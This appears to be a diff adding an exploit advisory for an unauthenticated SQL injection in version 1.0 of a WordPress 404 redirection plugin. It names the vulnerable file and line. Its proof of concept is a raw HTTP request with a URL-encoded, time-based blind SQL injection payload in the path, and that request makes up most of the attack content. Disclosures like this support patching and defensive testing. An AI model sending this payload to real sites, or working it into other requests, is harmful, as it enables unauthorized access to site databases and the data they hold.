@@ -1,0 +1,28 @@
+# Exploit Title: Unauthenticated SQL injeciton in 404 plugin for Wordpress v1.0
+# Google Dork: N/A
+# Date: 17/12/2016
+# Exploit Author: Ahmed Sherif (Deloitte)
+# Vendor Homepage: N/A
+# Software Link: https://wordpress.org/plugins/404-redirection-manager/
+# Version: V1.0
+# Tested on: Linux Mint
+# CVE : N/A
+
+
+The plugin does not properly sanitize the user input. Hence, it was
+vulnerable to SQL injection.
+
+The vulnerable page is : custom/lib/cf.SR_redirect_manager.class.php on line 356
+
+[#] Proof of Concept (PoC):
+
+
+GET /path-to-wordpress/%27%29%20AND%20%28SELECT%20%2a%20FROM%20%28SELECT%28SLEEP%285-%28IF%28%27a%27%3D%27a%27%2C0%2C5%29%29%29%29%29FPYG%29%20AND%20%28%27SQL%27%3D%27SQL
+HTTP/1.1
+Host: localhost
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: wp-settings-time-1=1480877693
+Connection: close*
